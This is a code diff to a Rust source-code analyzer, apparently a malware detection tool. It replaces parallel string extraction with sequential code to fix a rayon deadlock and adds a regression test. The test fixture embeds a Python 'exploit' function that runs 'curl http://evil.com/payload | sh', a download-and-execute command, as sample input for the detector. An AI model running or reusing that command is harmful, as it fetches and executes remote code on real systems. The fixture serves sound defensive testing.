@@ -428,60 +428,50 @@ impl UnifiedSourceAnalyzer {
         let timeout_limit = std::time::Duration::from_secs(4);
         let mut timed_out = false;
 
-        let tree = rayon::in_place_scope(|s| {
-            let mut stng_rx = None;
-            if !has_preextracted {
-                let (tx, rx) = crossbeam_channel::bounded(1);
-                stng_rx = Some(rx);
-                s.spawn(move |_| {
-                    let opts = stng::ExtractOptions::new(4)
-                        .with_garbage_filter(true)
-                        .with_xor(None);
-                    let _ = tx.send(stng::extract_strings_with_options(original_bytes, &opts));
-                });
-            }
+        // Run stng extraction first (sequential). Previously this used
+        // rayon::in_place_scope to overlap stng with tree-sitter parsing,
+        // but that deadlocks when nested inside a saturated rayon pool
+        // (e.g., scan_directory's par_iter): the spawned stng task waits
+        // for a free rayon thread, while the current thread blocks on
+        // recv() and can't process rayon work. stng on scripts is fast
+        // (single-digit ms), so the parallelism gain was negligible.
+        if !has_preextracted {
+            let opts = stng::ExtractOptions::new(4)
+                .with_garbage_filter(true)
+                .with_xor(None);
+            owned_stng = stng::extract_strings_with_options(original_bytes, &opts);
+        }
 
-            // Parse the source with a timeout
-            let mut options = tree_sitter::ParseOptions::new();
-            let mut cb = |_: &tree_sitter::ParseState| -> std::ops::ControlFlow<()> {
-                if start.elapsed() > timeout_limit {
-                    std::ops::ControlFlow::Break(())
+        // Parse the source with a timeout
+        let mut options = tree_sitter::ParseOptions::new();
+        let mut cb = |_: &tree_sitter::ParseState| -> std::ops::ControlFlow<()> {
+            if start.elapsed() > timeout_limit {
+                std::ops::ControlFlow::Break(())
+            } else {
+                std::ops::ControlFlow::Continue(())
+            }
+        };
+        options.progress_callback = Some(&mut cb);
+
+        let tree = self.parser.borrow_mut().parse_with_options(
+            &mut |i, _| {
+                if i < content.len() {
+                    &content.as_bytes()[i..]
                 } else {
-                    std::ops::ControlFlow::Continue(())
+                    &[]
                 }
-            };
-            options.progress_callback = Some(&mut cb);
+            },
+            None,
+            Some(options),
+        );
 
-            let tree_res = self.parser.borrow_mut().parse_with_options(
-                &mut |i, _| {
-                    if i < content.len() {
-                        &content.as_bytes()[i..]
-                    } else {
-                        &[]
-                    }
-                },
-                None,
-                Some(options),
-            );
-
-            if let Some(tree) = &tree_res {
-                let root = tree.root_node();
-                // Extract functions
-                self.extract_functions(&root, content.as_bytes(), &mut report);
-                // Extract strings
-                self.extract_strings(&root, content.as_bytes(), &mut report);
-            } else if start.elapsed() > timeout_limit {
-                timed_out = true;
-            }
-
-            if let Some(rx) = stng_rx {
-                if let Ok(res) = rx.recv() {
-                    owned_stng = res;
-                }
-            }
-
-            tree_res
-        });
+        if let Some(ref tree) = tree {
+            let root = tree.root_node();
+            self.extract_functions(&root, content.as_bytes(), &mut report);
+            self.extract_strings(&root, content.as_bytes(), &mut report);
+        } else if start.elapsed() > timeout_limit {
+            timed_out = true;
+        }
 
         if timed_out {
             tracing::info!(
@@ -1740,6 +1730,61 @@ func main() {
                 .iter()
                 .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
             "Expected micro-behaviors/communications/http/get::http-get"
+        );
+    }
+
+    /// Regression test for rayon deadlock when embedded code detection
+    /// triggers recursive `analyze_source_impl` from within a saturated
+    /// rayon thread pool. Before the fix, the inner `rayon::in_place_scope`
+    /// would wait forever for a free thread that could never appear.
+    #[test]
+    fn test_embedded_code_no_deadlock_under_rayon_pressure() {
+        use rayon::prelude::*;
+        use std::sync::mpsc;
+
+        // Python code large enough to trigger embedded code detection
+        // (> MIN_PLAIN_SIZE=50 bytes, with multiple language indicators)
+        let embedded_python = r#"import os
+import sys
+def exploit():
+    os.system('curl http://evil.com/payload | sh')
+    sys.exit(0)
+exploit()"#;
+
+        // A shell script that contains the embedded Python as a string
+        let shell_script = format!(
+            "#!/bin/bash\necho '{}'\ncurl http://example.com\n",
+            embedded_python
+        );
+
+        // Use a small thread pool to make deadlock more likely
+        let pool = rayon::ThreadPoolBuilder::new()
+            .num_threads(2)
+            .build()
+            .unwrap();
+
+        let (tx, rx) = mpsc::channel();
+
+        pool.spawn(move || {
+            // Saturate both threads with par_iter, each analyzing a script
+            // that may trigger embedded code detection → recursive analysis
+            let items: Vec<_> = (0..4).collect();
+            items.par_iter().for_each(|i| {
+                #[allow(clippy::expect_used)]
+                let analyzer =
+                    UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).expect("shell analyzer");
+                let path = PathBuf::from(format!("test_{}.sh", i));
+                let _report = analyzer.analyze_source(&path, &shell_script);
+            });
+            let _ = tx.send(());
+        });
+
+        // If the deadlock is present, this will hang forever.
+        // 30 seconds is very generous — normal completion is <1s.
+        let result = rx.recv_timeout(std::time::Duration::from_secs(30));
+        assert!(
+            result.is_ok(),
+            "Timed out — likely deadlock in embedded code detection under rayon pressure"
         );
     }
 }
